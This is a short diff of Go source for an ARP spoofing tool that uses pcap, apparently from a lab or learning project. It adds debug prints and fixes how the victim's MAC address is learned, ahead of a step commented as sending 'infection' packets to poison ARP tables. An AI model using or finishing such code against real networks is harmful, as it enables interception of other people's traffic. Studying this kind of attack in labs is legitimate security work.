@@ -71,7 +71,9 @@ func main() {
 	}
 
 	attackerIP = getAttackerIP()
+	fmt.Printf("attackerIP: %s\n", attackerIP) // !debug
 	attackerMAC = getAttackerMAC(intf)
+	fmt.Printf("attackerMAC: %s\n", attackerMAC) // !debug
 
 	if handle, err := pcap.OpenLive(intf, BUFSIZ, true, time.Second); err != nil {
 		fmt.Printf("couldn't open device %s\n", intf)
@@ -108,12 +110,15 @@ func main() {
 				for packet := range packetSource.Packets() {
 					if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
 						arp, _ := arpLayer.(*layers.ARP)
-						senderMAC = arp.DstHwAddress
-						break
+						if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
+							senderMAC = arp.SourceHwAddress
+							break
+						}
 					}
 				}
 			}
 			fmt.Printf("[+] Successfully got MAC address of %s\n", senderIPs[i])
+			fmt.Printf("senderMAC: %s\n", senderMAC) // !debug
 
 			/** Send Infection packet to poison ARP table */
 			ethernetLayer2 := &layers.Ethernet{
